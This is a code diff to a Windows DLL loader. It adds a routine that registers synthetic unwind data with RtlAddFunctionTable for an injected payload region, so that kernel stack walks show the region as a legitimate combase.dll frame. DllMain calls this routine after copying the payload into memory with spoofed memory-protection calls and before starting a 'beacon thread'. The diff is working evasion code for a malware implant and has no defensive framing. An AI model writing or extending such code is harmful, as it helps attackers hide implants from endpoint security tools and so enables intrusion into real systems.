@@ -28,6 +28,45 @@ typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
 typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);
 typedef void *(WINAPI *pfnGetGhostAddr)(void);
 
+/* BYOUD (Bring Your Own Unwind Data): register synthetic RUNTIME_FUNCTION
+ * unwind info for the payload region via RtlAddFunctionTable so kernel
+ * stack walks through the region resolve to a legitimate unwind chain. */
+
+typedef BOOLEAN (WINAPI *pfnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+
+static RUNTIME_FUNCTION g_byoud_fn_tbl[1] = {{0}};
+static BYTE g_byoud_unwind[16] = {0};
+
+static void setup_byoud(void *slot, SIZE_T len)
+{
+    HMODULE combase = GetModuleHandleW(L"combase.dll");
+    if (!combase) return;
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    if (!ntdll) return;
+    pfnRtlAddFunctionTable p = (pfnRtlAddFunctionTable)GetProcAddress(ntdll, "RtlAddFunctionTable");
+    if (!p) return;
+
+    DWORD64 base = (DWORD64)combase;
+    DWORD rva_start = (DWORD)((DWORD64)slot - base);
+    DWORD rva_unwind = (DWORD)((DWORD64)g_byoud_unwind - base);
+
+    g_byoud_fn_tbl[0].BeginAddress = rva_start;
+    g_byoud_fn_tbl[0].EndAddress   = rva_start + (DWORD)len;
+    g_byoud_fn_tbl[0].UnwindData   = rva_unwind;
+
+    g_byoud_unwind[0] = 0x01;
+    g_byoud_unwind[1] = 0x10;
+    g_byoud_unwind[2] = 0x04;
+    g_byoud_unwind[3] = 0x50;
+    g_byoud_unwind[4] = 0x10;
+    g_byoud_unwind[5] = 0x11;
+    *(DWORD*)(g_byoud_unwind + 6) = 0x8000;
+    g_byoud_unwind[10] = 0x01;
+    g_byoud_unwind[11] = 0x50;
+
+    p(g_byoud_fn_tbl, 1, base);
+}
+
 typedef struct {
     void  *slot;
     SIZE_T len;
@@ -117,6 +156,12 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     if (!spoof_vp(slot, len, PAGE_READWRITE, &old))    { HeapFree(heap, 0, ctx); return FALSE; }
     memcpy(slot, pt, len);
     if (!spoof_vp(slot, len, PAGE_EXECUTE_READ, &old)) { HeapFree(heap, 0, ctx); return FALSE; }
+
+    /* Register synthetic unwind data covering the payload region
+     * BEFORE launching the beacon thread, so any subsequent kernel
+     * stack walk unwinds cleanly through the region as a legitimate
+     * frame of combase.dll (its module base). */
+    setup_byoud(slot, len);
 
     HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
     if (!t) { HeapFree(heap, 0, ctx); return FALSE; }
